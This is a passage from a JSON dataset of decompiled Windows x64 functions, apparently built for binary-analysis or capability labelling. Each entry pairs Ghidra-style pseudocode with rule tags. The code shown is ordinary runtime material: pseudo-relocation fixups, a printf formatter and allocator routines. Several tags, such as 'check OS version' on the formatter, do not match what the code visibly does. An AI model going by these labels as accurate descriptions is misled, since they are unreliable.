        "decompiled_code": "\nvoid fcn.140013a80(uint8_t **arg1)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    ulong uVar6;\n    uint32_t *puVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    uint8_t **ppuVar10;\n    uint *puVar11;\n    int64_t iVar12;\n    int32_t *piVar13;\n    uint uVar14;\n    char *arg1_00;\n    uint32_t uVar15;\n    uint64_t arg2;\n    uint32_t *puVar16;\n    int64_t iVar17;\n    int64_t iVar18;\n    uint8_t *puVar19;\n    uint8_t **arg1_01;\n    uint8_t **in_R8;\n    uint32_t uVar20;\n    uint8_t **in_R9;\n    ulong in_XMM2_Qa;\n    ulong in_XMM3_Qa;\n    ulong auStack336 [5];\n    uint auStack296 [2];\n    uint64_t uStack288;\n    uchar auStack280 [16];\n    ulong auStack264 [7];\n    uint8_t *apuStack208 [2];\n    uchar auStack192 [12];\n    uchar auStack180 [12];\n    uint8_t **ppuStack168;\n    int64_t iStack160;\n    int64_t iStack152;\n    uint8_t *apuStack72 [3];\n    uint8_t *puStack48;\n    int32_t iStack36;\n    \n    iStack160 = *0x140136154;\n    if (*0x140136154 < 1) goto code_r0x000140013bb0;\n    in_R9 = NULL;\n    ppuVar10 = *0x140136158 + 0x18;\n    do {\n        in_R8 = *ppuVar10;\n        if ((in_R8 <= arg1) && (in_R8 = in_R8 + *(ppuVar10[1] + 8),  arg1 < in_R8)) {\n            return;\n        }\n        uVar20 = in_R9 + 1;\n        in_R9 = uVar20;\n        ppuVar10 = ppuVar10 + 5;\n    } while (uVar20 != *0x140136154);\n    while (iStack152 = fcn.1400144d0(arg1),  iStack152 != 0) {\n        arg1 = iStack160 * 0x28;\n        puVar11 = *0x140136158 + arg1;\n        *(puVar11 + 8) = iStack152;\n        *puVar11 = 0;\n        iVar12 = fcn.140014610();\n        iVar12 = iVar12 + *(iStack152 + 0xc);\n        *(*0x140136158 + 0x18 + arg1) = iVar12;\n        iVar12 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(iVar12, apuStack72, 0x30);\n        if (iVar12 == 0) {\n            in_R8 = *(*0x140136158 + 0x18 + arg1);\n            fcn.140013a10(\"  VirtualQuery failed for %d bytes at address %p\", *(iStack152 + 8), in_R8, in_R9);\n            break;\n        }\n        if (((iStack36 - 0x40U & 0xffffffbf) == 0) || ((iStack36 - 4U & 0xfffffffb) == 0)) {\ncode_r0x000140013b4e:\n            *0x140136154 = *0x140136154 + 1;\n            return;\n        }\n        in_R8 = 0x40;\n        if (iStack36 == 2) {\n            in_R8 = 0x4;\n        }\n        arg1 = arg1 + *0x140136158;\n        arg1[1] = apuStack72[0];\n        arg1[2] = puStack48;\n        in_R9 = arg1;\n        iVar9 = (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n        if (iVar9 != 0) goto code_r0x000140013b4e;\n        uVar20 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.140013a10(\"  VirtualProtect failed with code 0x%x\", uVar20, in_R8, in_R9);\ncode_r0x000140013bb0:\n        iStack160 = 0;\n    }\n    arg1_00 = \"Address %p has no image-section\";\n    fcn.140013a10(\"Address %p has no image-section\", arg1, in_R8, in_R9);\n    iVar9 = *0x140136150;\n    if (*0x140136150 != 0) {\n        return;\n    }\n    *0x140136150 = 1;\n    auStack264[2] = 0x140013c37;\n    ppuStack168 = arg1;\n    fcn.140014550();\n    auStack264[2] = 0x140013c4e;\n    iVar12 = fcn.1400147b0(arg1_00);\n    iVar17 = *0x140110860;\n    puVar7 = *0x140110810;\n    *0x140136154 = 0;\n    iVar12 = -iVar12;\n    *0x140136158 = auStack192 + iVar12;\n    if (*0x140110810 - *0x140110820 < 8) {\n        *0x140136154 = 0;\n        return;\n    }\n    puVar16 = *0x140110820;\n    if (*0x140110810 - *0x140110820 < 0xc) {\ncode_r0x000140013c8d:\n        if (*puVar16 == 0) {\n            uVar20 = puVar16[1];\ncode_r0x000140013c9a:\n            if (uVar20 == 0) {\n                arg2 = puVar16[2];\n                if (puVar16[2] != 1) {\ncode_r0x000140013f3e:\n                    uVar14 = 0x4010f480;\n                    *(auStack264 + iVar12 + 0x10) = 0x140013f4a;\n                    fcn.140013a10(\"  Unknown pseudo relocation protocol version %d.\\n\", arg2, in_R8, in_R9);\n                    if (*0x140136160 != NULL) {\n                        uVar5 = *(apuStack208 + iVar12 + 8);\n                        *(auStack296 + iVar12) = uVar14;\n                        *(&uStack288 + iVar12) = arg2;\n                        *(auStack280 + iVar12) = CONCAT88(in_XMM3_Qa, in_XMM2_Qa);\n                        *(auStack264 + iVar12) = uVar5;\n                        *(auStack336 + iVar12) = 0x140013f88;\n                        (**0x140136160)(auStack296 + iVar12);\n                    }\n                    return;\n                }\n                puVar16 = puVar16 + 3;\n                if (*0x140110810 <= puVar16) {\n                    *0x140136154 = 0;\n                    return;\n                }\n                do {\n                    while( true ) {\n                        uVar20 = puVar16[2];\n                        ppuVar10 = *puVar16 + iVar17;\n                        arg2 = uVar20;\n                        in_R9 = *ppuVar10;\n                        arg1_01 = puVar16[1] + iVar17;\n                        if ((uVar20 & 0xff) == 0x20) goto code_r0x000140013e68;\n                        uVar15 = uVar20 & 0xff;\n                        if ((uVar20 & 0xff) < 0x21) break;\n                        if (uVar15 != 0x40) {\ncode_r0x000140013f32:\n                            *(auStack264 + iVar12 + 0x10) = 0x140013f3e;\n                            fcn.140013a10(\"  Unknown pseudo relocation bit size %d.\\n\", arg2, in_R8, in_R9);\n                            goto code_r0x000140013f3e;\n                        }\n                        puVar19 = (*arg1_01 - ppuVar10) + in_R9;\n                        if (((uVar20 & 0xc0) == 0) && (-1 < puVar19)) goto code_r0x000140013e4f;\n                        *(auStack264 + iVar12 + 0x10) = 0x140013eb8;\n                        fcn.140013a80(arg1_01);\n                        *arg1_01 = puVar19;\ncode_r0x000140013d15:\n                        puVar16 = puVar16 + 3;\n                        if (puVar7 <= puVar16) goto code_r0x000140013db0;\n                    }\n                    if (uVar15 == 8) {\n                        uVar2 = *arg1_01;\n                        if (uVar2 < '\\0') {\n                            iVar18 = (uVar2 | 0xffffffffffffff00) - ppuVar10;\n                        }\n                        else {\n                            iVar18 = uVar2 - ppuVar10;\n                        }\n                        puVar19 = iVar18 + in_R9;\n                        if (((uVar20 & 0xc0) == 0) && ((0xff < puVar19 || (puVar19 < -0x80)))) {\ncode_r0x000140013e4f:\n                            do {\n                                *(apuStack208 + iVar12) = puVar19;\n                                uVar20 = 0x4010f4e8;\n                                *(auStack264 + iVar12 + 0x10) = 0x140013e63;\n                                in_R8 = arg1_01;\n                                ppuVar10 = fcn.140013a10(\"%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p.\\n\"\n                                                         , arg2, arg1_01, in_R9);\ncode_r0x000140013e68:\n                                uVar15 = *arg1_01;\n                                if (uVar15 < 0) {\n                                    iVar18 = (uVar15 | 0xffffffff00000000) - ppuVar10;\n                                }\n                                else {\n                                    iVar18 = uVar15 - ppuVar10;\n                                }\n                                puVar19 = iVar18 + in_R9;\n                            } while (((uVar20 & 0xc0) == 0) && ((puVar19 < -0x80000000 || (0xffffffff < puVar19))));\n                            *(auStack264 + iVar12 + 0x10) = 0x140013ea2;\n                            fcn.140013a80(arg1_01);\n                            *arg1_01 = puVar19;\n                        }\n                        else {\n                            *(auStack264 + iVar12 + 0x10) = 0x140013d12;\n                            fcn.140013a80(arg1_01);\n                            *arg1_01 = puVar19;\n                        }\n                        goto code_r0x000140013d15;\n                    }\n                    if (uVar15 != 0x10) goto code_r0x000140013f32;\n                    uVar3 = *arg1_01;\n                    if (uVar3 < 0) {\n                        iVar18 = (uVar3 | 0xffffffffffff0000) - ppuVar10;\n                    }\n                    else {\n                        iVar18 = uVar3 - ppuVar10;\n                    }\n                    puVar19 = iVar18 + in_R9;\n                    if (((uVar20 & 0xc0) == 0) && ((puVar19 < -0x8000 || (0xffff < puVar19))))\n                    goto code_r0x000140013e4f;\n                    puVar16 = puVar16 + 3;\n                    *(auStack264 + iVar12 + 0x10) = 0x140013d9c;\n                    fcn.140013a80(arg1_01);\n                    *arg1_01 = puVar19;\n                } while (puVar16 < puVar7);\n                goto code_r0x000140013db0;\n            }\n        }\n    }\n    else if (**0x140110820 == 0) {\n        uVar20 = (*0x140110820)[1];\n        if ((uVar20 | (*0x140110820)[2]) == 0) {\n            puVar16 = *0x140110820 + 3;\n            goto code_r0x000140013c8d;\n        }\n        goto code_r0x000140013c9a;\n    }\n    if (*0x140110810 <= puVar16) {\n        *0x140136154 = 0;\n        return;\n    }\n    do {\n        puVar1 = puVar16 + 1;\n        uVar20 = *puVar16;\n        puVar16 = puVar16 + 2;\n        piVar13 = *puVar1 + iVar17;\n        iVar4 = *piVar13;\n        *(auStack264 + iVar12 + 0x10) = 0x140013f26;\n        fcn.140013a80(piVar13);\n        *piVar13 = uVar20 + iVar4;\n    } while (puVar16 < puVar7);\ncode_r0x000140013db0:\n    pcVar8 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    if (0 < *0x140136154) {\n        iVar17 = 0;\n        do {\n            piVar13 = *0x140136158 + iVar17;\n            iVar4 = *piVar13;\n            if (iVar4 != 0) {\n                uVar5 = *(piVar13 + 4);\n                uVar6 = *(piVar13 + 2);\n                *(auStack264 + iVar12 + 0x10) = 0x140013def;\n                (*pcVar8)(uVar6, uVar5, iVar4, auStack180);\n            }\n            iVar9 = iVar9 + 1;\n            iVar17 = iVar17 + 0x28;\n        } while (iVar9 < *0x140136154);\n    }\n    return;\n}\n",
        "token_count": 3165
    },
    "1400199a": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t fcn.1400199a0(ulong arg1, int64_t arg2, ulong arg3, char *arg4)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint *puVar5;\n    ulong arg1_00;\n    int64_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    float10 *pfVar9;\n    int16_t iVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uint16_t uVar13;\n    uint8_t *puVar14;\n    uint8_t *puVar15;\n    char16_t *arg1_01;\n    uint8_t *puVar16;\n    int32_t iVar17;\n    int32_t *piVar18;\n    float10 fVar19;\n    float10 **in_stack_00000028;\n    uint64_t uStack200;\n    uint16_t uStack192;\n    unkbyte6 Stack190;\n    float10 afStack168 [3];\n    ushort uStack138;\n    float10 *apfStack136 [2];\n    int64_t iStack120;\n    uint32_t uStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    uint uStack100;\n    ushort uStack96;\n    int32_t iStack92;\n    ushort uStack88;\n    uint32_t uStack84;\n    int32_t iStack80;\n    uint uStack76;\n    \n    puVar5 = sub.msvcrt.dll__errno();\n    uVar7 = *arg4;\n    arg1._0_4_ = arg1 & 0x6000;\n    uVar1 = *puVar5;\n    iStack80 = arg3;\n    puVar14 = arg4 + 1;\n    iStack104 = -1;\n    uStack100 = 0xfffffffd;\n    uStack96 = 0;\n    iStack108 = -1;\n    iStack92 = 0;\n    uStack88 = 0;\n    uStack84 = 0;\n    uStack76 = 0xffffffff;\n    if (*arg4 == '\\0') {\n        return uVar7;\n    }\n    iStack120 = arg2;\n    uStack112 = arg1;\n    uVar8 = uVar7;\ncode_r0x000140019a9e:\n    uVar3 = uStack84;\n    if (uVar7 == 0x25) {\n        uVar4 = *puVar14;\n        iStack108 = -1;\n        iStack104 = -1;\n        if (uVar4 == 0) {\n            return uStack84;\n        }\n        iVar17 = 0;\n        uVar7 = 0;\n        puVar15 = puVar14;\n        piVar18 = &iStack108;\n        uStack112 = arg1;\n        do {\n            puVar16 = puVar15 + 1;\n            uVar8 = uVar4;\n    // switch table (91 cases) at 0x14010f8c0\n            switch(uVar4) {\n            case 0x20:\n                if (uVar7 != 0) goto code_r0x000140019b40;\n                uVar4 = puVar15[1];\n                uStack112 = uStack112 | 0x40;\n                break;\n            default:\n                if ((9 < uVar4 - 0x30) || (3 < uVar7)) {\ncode_r0x000140019d17:\n                    fcn.140017f90(0x25, &iStack120);\n                    puVar16 = puVar14;\n                    goto code_r0x000140019a8c;\n                }\n                if (uVar7 == 0) {\n                    uVar7 = 1;\n                }\n                else {\ncode_r0x00014001a259:\n                    if (uVar7 == 2) {\n                        uVar7 = 3;\n                    }\n                }\n                if (piVar18 != NULL) {\n                    if (*piVar18 < 0) {\n                        uVar4 = puVar15[1];\n                        *piVar18 = uVar8 - 0x30;\n                        break;\n                    }\n                    *piVar18 = (uVar8 - 0x30) + *piVar18 * 10;\n                }\ncode_r0x000140019b40:\n                uVar4 = puVar15[1];\n                break;\n            case 0x23:\n                if (uVar7 != 0) goto code_r0x000140019b40;\n                uVar4 = puVar15[1];\n                uStack112 = uStack112 | 0x800;\n                break;\n            case 0x25:\n                goto code_r0x00014001a0ba;\n            case 0x27:\n                if (uVar7 != 0) goto code_r0x000140019b40;\n                uStack112 = uStack112 | 0x1000;\n                apfStack136[0] = apfStack136[0] & 0xffffffff00000000;\n                iVar6 = sub.msvcrt.dll_localeconv();\n                iStack92 = fcn.14001e240(&uStack138, *(iVar6 + 8), 0x10, apfStack136);\n                if (0 < iStack92) {\n                    uStack88 = uStack138;\n                }\n                uVar4 = puVar15[1];\n                break;\n            case 0x2a:\n                if (piVar18 == NULL) {\ncode_r0x000140019f19:\n                    uVar4 = puVar15[1];\n                    uVar7 = 4;\n                }\n                else if ((uVar7 & 0xfffffffd) == 0) {\n                    iVar2 = *in_stack_00000028;\n                    in_stack_00000028 = in_stack_00000028 + 1;\n                    *piVar18 = iVar2;\n                    if (iVar2 < 0) {\n                        if (uVar7 != 0) {\n                            uVar4 = puVar15[1];\n                            piVar18 = NULL;\n                            iStack104 = -1;\n                            uVar7 = 2;\n                            break;\n                        }\n                        uStack112 = uStack112 | 0x400;\n                        iStack108 = -iStack108;\n                    }\n                    uVar4 = puVar15[1];\n                    piVar18 = NULL;\n                }\n                else {\n                    uVar4 = puVar15[1];\n                    piVar18 = NULL;\n                    uVar7 = 4;\n                }\n                break;\n            case 0x2b:\n                if (uVar7 != 0) goto code_r0x000140019b40;\n                uVar4 = puVar15[1];\n                uStack112 = uStack112 | 0x100;\n                break;\n            case 0x2d:\n                if (uVar7 != 0) goto code_r0x000140019b40;\n                uVar4 = puVar15[1];\n                uStack112 = uStack112 | 0x400;\n                break;\n            case 0x2e:\n                if (1 < uVar7) goto code_r0x000140019f19;\n                uVar4 = puVar15[1];\n                uVar7 = 2;\n                iStack104 = 0;\n                piVar18 = &iStack104;\n                break;\n            case 0x30:\n                if (uVar7 != 0) {\n                    if (uVar7 != 4) {\n                        uVar8 = 0x30;\n                        goto code_r0x00014001a259;\n                    }\n                    goto code_r0x000140019d17;\n                }\n                uVar4 = puVar15[1];\n                uStack112 = uStack112 | 0x200;\n                break;\n            case 0x41:\n                pfVar9 = *in_stack_00000028;\n                if ((uStack112 & 4) != 0) goto code_r0x000140019d5e;\ncode_r0x000140019f58:\n                uVar7 = pfVar9;\n                uVar8 = pfVar9 >> 0x20;\n                if (((-uVar7 | uVar7) >> 0x1f | uVar8 & 0x7fffffff) < 0x7ff00001) {\n                    fVar19 = pfVar9;\n                    uStack200 = SUB108(fVar19, 0);\n                    uStack192 = fVar19 >> 0x40;\n                    uVar12 = CONCAT62(Stack190, uStack192);\n                    if (fVar19 < 0) {\n                        uStack112 = uStack112 | 0x80;\n                    }\n                    uVar7 = uVar8 & 0xfffff | uVar7;\n                    if ((uVar7 == 0 && (uVar8 & 0x7ff00000) == 0x7ff00000) && ((uVar7 | uVar8 & 0x7ff00000) != 0)) {\n                        fcn.140018320(uVar12 & 0x8000, 0x14010f8ba, &iStack120);\n                        goto code_r0x000140019e70;\n                    }\n                    uVar11 = uVar12 & 0xffffffffffff7fff;\n                    if ((fVar19 & 0x7fff) == 0) {\ncode_r0x00014001a2e9:\n                        uVar12 = uVar12 & 0xffff7fff;\n                        if (uStack200 != 0) {\n                            uVar12 = 0xfffffc05;\n                        }\n                    }\n                    else {\n                        iVar10 = uVar11;\n                        if (iVar10 == 0x3c00 || SBORROW2(uStack192 & 0x7fff, 0x3c00) != iVar10 + -0x3c00 < 0) {\n                            uStack200 = uStack200 >> (0x3c01 - iVar10 & 0x3f);\n                            uVar11 = uVar11 + (0x3c01 - iVar10);\n                        }\n                        else if (iVar10 == 0) goto code_r0x00014001a2e9;\n                        uVar12 = uVar11 & 0xffffffffffff0000 | uVar11 + 0xc004;\n                    }\n                    uStack200 = uStack200 >> 3;\n                    goto code_r0x00014001a1f7;\n                }\ncode_r0x00014001a26b:\n                fcn.140018320(0, 0x14010f8b6, &iStack120);\n                goto code_r0x000140019e70;\n            case 0x43:\n                goto code_r0x000140019fff;\n            case 0x45:\n                pfVar9 = *in_stack_00000028;\n                if ((uStack112 & 4) != 0) goto code_r0x000140019ec1;\ncode_r0x00014001a037:\n                afStack168[0] = pfVar9;\n                fcn.140019200(afStack168, &iStack120);\n                goto code_r0x000140019e70;\n            case 0x46:\n                pfVar9 = *in_stack_00000028;\n                if ((uStack112 & 4) != 0) goto code_r0x000140019e93;\ncode_r0x00014001a068:\n                afStack168[0] = pfVar9;\n                fcn.1400192a0(afStack168, &iStack120);\n                goto code_r0x000140019e70;\n            case 0x47:\n                pfVar9 = *in_stack_00000028;\n                if ((uStack112 & 4) != 0) goto code_r0x000140019e5b;\ncode_r0x00014001a099:\n                afStack168[0] = pfVar9;\n                fcn.140019380(afStack168, &iStack120);\n                goto code_r0x000140019e70;\n            case 0x49:\n                uVar4 = puVar15[1];\n                if (uVar4 == 0x36) {\n                    if (puVar15[2] != 0x34) goto code_r0x000140019d17;\n                    uVar4 = puVar15[3];\n                    iVar17 = 3;\n                    puVar16 = puVar15 + 3;\n                    uVar7 = 4;\n                }\n                else if (uVar4 == 0x33) {\n                    if (puVar15[2] != 0x32) goto code_r0x000140019d17;\n                    uVar4 = puVar15[3];\n                    iVar17 = 2;\n                    puVar16 = puVar15 + 3;\n                    uVar7 = 4;\n                }\n                else {\n                    iVar17 = 3;\n                    uVar7 = 4;\n                }\n                break;\n            case 0x4c:\n                uVar4 = puVar15[1];\n                uStack112 = uStack112 | 4;\n                uVar7 = 4;\n                break;\n            case 0x53:\ncode_r0x00014001a20a:\n                arg1_01 = *in_stack_00000028;\n                if (arg1_01 == NULL) {\n                    arg1_01 = L\"(null)\";\n                }\n                if (iStack104 < 0) {\n                    uVar7 = sub.msvcrt.dll_wcslen(arg1_01);\n                    fcn.140017ff0(arg1_01, uVar7, &iStack120);\n                }\n                else {\n                    uVar7 = fcn.14001dce0(arg1_01, iStack104);\n                    fcn.140017ff0(arg1_01, uVar7, &iStack120);\n                }\n                goto code_r0x000140019e39;\n            case 0x58:\n            case 0x6f:\n            case 0x75:\n            case 0x78:\n                uStack112 = uStack112 & 0xfffffeff;\n                if (iVar17 == 3) {\n                    apfStack136[0] = *in_stack_00000028;\n                }\n                else if (iVar17 == 2) {\n                    apfStack136[0] = *in_stack_00000028;\n                }\n                else {\n                    uVar7 = *in_stack_00000028;\n                    if (iVar17 == 1) {\n                        apfStack136[0] = uVar7 & 0xffff;\n                    }\n                    else {\n                        apfStack136[0] = uVar7 & 0xff;\n                        if (iVar17 != 5) {\n                            apfStack136[0] = uVar7;\n                        }\n                    }\n                }\n                if (uVar8 == 0x75) {\n                    fcn.140018870(apfStack136[0], &iStack120);\n                }\n                else {\n                    fcn.1400183c0(uVar8, apfStack136[0], &iStack120);\n                }\n                goto code_r0x000140019e70;\n            case 0x61:\n                pfVar9 = *in_stack_00000028;\n                uVar8 = uStack112 | 0x20;\n                uVar7 = uStack112 & 4;\n                uStack112 = uVar8;\n                if (uVar7 == 0) goto code_r0x000140019f58;\ncode_r0x000140019d5e:\n                uVar7 = *(pfVar9 + 8);\n                uStack200 = *pfVar9;\n                uVar13 = uVar7;\n                uVar8 = uStack200 >> 0x20 & 0x7fffffff | uStack200;\n                if (0xfffe - ((-uVar8 | uVar8) >> 0x1f | uVar13 * 2 & 0xffffU) >> 0x10 != 0) goto code_r0x00014001a26b;\n                if (uVar13 < 0) {\n                    uStack112 = uStack112 | 0x80;\n                }\n                uVar12 = uVar7 & 0xffffffffffff7fff;\n                if ((uVar7 & 0x7fff) == 0) {\n                    if (uStack200 != 0) {\n                        uVar12 = 0xffffc002;\n                    }\n                }\n                else {\n                    if (((uVar13 & 0x7fff) == 0x7fff) && (uVar8 == 0)) {\n                        fcn.140018320(uVar13 & 0x8000, 0x14010f8ba, &iStack120);\n                        goto code_r0x000140019e70;\n                    }\n                    uVar12 = uVar7 & 0xffffffffffff0000 | uVar12 + 0xc001;\n                }\ncode_r0x00014001a1f7:\n                fcn.140019500(uStack200, uVar12, &iStack120);\n                goto code_r0x000140019e70;\n            case 99:\n                iStack104 = -1;\n                if (iVar17 - 2U < 2) {\ncode_r0x000140019fff:\n                    iStack104 = -1;\n                    apfStack136[0] = apfStack136[0] & 0xffffffffffff0000 | *in_stack_00000028;\n                    fcn.140017ff0(apfStack136, 1, &iStack120);\n                    in_stack_00000028 = in_stack_00000028 + 1;\n                }\n                else {\n                    apfStack136[0] = apfStack136[0] & 0xffffffffffffff00 | *in_stack_00000028;\n                    fcn.140018180(apfStack136, 1, &iStack120);\n                    in_stack_00000028 = in_stack_00000028 + 1;\n                }\n                goto code_r0x000140019a8c;\n            case 100:\n            case 0x69:\n                uStack112 = uStack112 | 0x80;\n                if (iVar17 == 3) {\n                    pfVar9 = *in_stack_00000028;\n                }\n                else {\n                    iVar2 = *in_stack_00000028;\n                    pfVar9 = iVar2;\n                    if (iVar17 != 2) {\n                        if (iVar17 == 1) {\n                            pfVar9 = iVar2;\n                        }\n                        else if (iVar17 == 5) {\n                            pfVar9 = iVar2;\n                        }\n                    }\n                }\n                fcn.140018870(pfVar9, &iStack120);\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x000140019a8c;\n            case 0x65:\n                pfVar9 = *in_stack_00000028;\n                uVar8 = uStack112 | 0x20;\n                uVar7 = uStack112 & 4;\n                uStack112 = uVar8;\n                if (uVar7 == 0) goto code_r0x00014001a037;\ncode_r0x000140019ec1:\n                afStack168[0] = *pfVar9;\n                fcn.140019200(afStack168, &iStack120);\n                goto code_r0x000140019e70;\n            case 0x66:\n                pfVar9 = *in_stack_00000028;\n                uVar8 = uStack112 | 0x20;\n                uVar7 = uStack112 & 4;\n                uStack112 = uVar8;\n                if (uVar7 == 0) goto code_r0x00014001a068;\ncode_r0x000140019e93:\n                afStack168[0] = *pfVar9;\n                fcn.1400192a0(afStack168, &iStack120);\n                goto code_r0x000140019e70;\n            case 0x67:\n                pfVar9 = *in_stack_00000028;\n                uVar8 = uStack112 | 0x20;\n                uVar7 = uStack112 & 4;\n                uStack112 = uVar8;\n                if (uVar7 == 0) goto code_r0x00014001a099;\ncode_r0x000140019e5b:\n                afStack168[0] = *pfVar9;\n                fcn.140019380(afStack168, &iStack120);\n                goto code_r0x000140019e70;\n            case 0x68:\n                uVar4 = puVar15[1];\n                if (uVar4 == 0x68) {\n                    uVar4 = puVar15[2];\n                    iVar17 = 5;\n                    puVar16 = puVar15 + 2;\n                    uVar7 = 4;\n                }\n                else {\n                    iVar17 = 1;\n                    uVar7 = 4;\n                }\n                break;\n            case 0x6a:\n            case 0x74:\n            case 0x7a:\n                uVar4 = puVar15[1];\n                iVar17 = 3;\n                uVar7 = 4;\n                break;\n            case 0x6c:\n                uVar4 = puVar15[1];\n                if (uVar4 == 0x6c) {\n                    uVar4 = puVar15[2];\n                    iVar17 = 3;\n                    puVar16 = puVar15 + 2;\n                    uVar7 = 4;\n                }\n                else {\n                    iVar17 = 2;\n                    uVar7 = 4;\n                }\n                break;\n            case 0x6d:\n                arg1_00 = sub.msvcrt.dll_strerror(uVar1);\n                fcn.1400182d0(arg1_00, &iStack120);\n                goto code_r0x000140019a8c;\n            case 0x6e:\n                pfVar9 = *in_stack_00000028;\n                if (iVar17 == 5) {\n                    *pfVar9 = uStack84;\n                }\n                else if (iVar17 == 1) {\n                    *pfVar9 = uStack84;\n                }\n                else if ((iVar17 == 2) || (iVar17 != 3)) {\n                    *pfVar9 = uStack84;\n                }\n                else {\n                    *pfVar9 = uStack84;\n                }\ncode_r0x000140019e70:\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x000140019a8c;\n            case 0x70:\n                if ((uVar7 == 0) && (uStack112 == arg1)) {\n                    iStack104 = 0x10;\n                    uStack112 = arg1 | 0x200;\n                }\n                fcn.1400183c0(0x78, *in_stack_00000028, &iStack120);\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x000140019a8c;\n            case 0x73:\n                if (iVar17 - 2U < 2) goto code_r0x00014001a20a;\n                fcn.1400182d0(*in_stack_00000028, &iStack120);\ncode_r0x000140019e39:\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x000140019a8c;\n            }\n            puVar15 = puVar16;\n            if (uVar4 == 0) {\n                return uStack84;\n            }\n        } while( true );\n    }\n    if (((uStack112 & 0x4000) != 0) || (uStack84 < iStack80)) {\n        if ((uStack112 & 0x2000) == 0) {\n            *(iStack120 + uStack84) = uVar8;\n        }\n        else {\n            sub.msvcrt.dll_fputc();\n        }\n    }\n    uStack84 = uVar3 + 1;\n    puVar16 = puVar14;\n    goto code_r0x000140019a8c;\ncode_r0x00014001a0ba:\n    fcn.140017f90(0x25, &iStack120);\ncode_r0x000140019a8c:\n    uVar8 = *puVar16;\n    puVar14 = puVar16 + 1;\n    uVar7 = *puVar16;\n    if (uVar7 == 0) {\n        return uStack84;\n    }\n    goto code_r0x000140019a9e;\n}\n",
        "token_count": 5470
    },
    "14001cfa": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.14001cfa0(ulong *arg1)\n\n{\n    ulong uVar1;\n    bool bVar2;\n    \n    if (arg1 != NULL) {\n        if (9 < *(arg1 + 1)) {\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)();\n            return;\n        }\n        fcn.14001cd80(0);\n        bVar2 = *0x140136cd0 == 2;\n        uVar1 = *(*(arg1 + 1) * 8 + 0x140136c80);\n        *(*(arg1 + 1) * 8 + 0x140136c80) = arg1;\n        *arg1 = uVar1;\n        if (bVar2) {\n    // WARNING: Could not recover jumptable at 0x00014001cffc. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x140136ce0);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 263
    },
    "14001ceb": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.14001ceb0(ulong arg1)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    ulong *puVar3;\n    uint64_t uVar4;\n    int32_t iVar5;\n    \n    fcn.14001cd80(0);\n    iVar2 = *0x140136cd0;\n    if (arg1 < 10) {\n        puVar3 = *(arg1 * 8 + 0x140136c80);\n        if (puVar3 != NULL) {\n            *(arg1 * 8 + 0x140136c80) = *puVar3;\n            goto joined_r0x00014001cf35;\n        }\n        iVar5 = 1 << (arg1 & 0x1f);\n        uVar1 = (iVar5 + 9) * 4 - 1;\n        uVar4 = uVar1 >> 3;\n        if (0x120 < (*0x140106510 + -0x28026c70 >> 3) + uVar4) goto code_r0x00014001cf1a;\n        puVar3 = *0x140106510;\n        *0x140106510 = *0x140106510 + (uVar1 & 0xfffffffffffffff8);\n    }\n    else {\n        iVar5 = 1 << (arg1 & 0x1f);\n        uVar4 = iVar5 * 4 + 0x23U >> 3 & 0xffffffff;\ncode_r0x00014001cf1a:\n        puVar3 = sub.msvcrt.dll_malloc(uVar4 << 3);\n        if (puVar3 == NULL) {\n            return;\n        }\n    }\n    iVar2 = *0x140136cd0;\n    *(puVar3 + 1) = arg1;\n    *(puVar3 + 0xc) = iVar5;\njoined_r0x00014001cf35:\n    if (iVar2 == 2) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x140136ce0);\n    }\n    puVar3[2] = 0;\n    return;\n}\n",
        "token_count": 468
    },
    "14001d0d": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
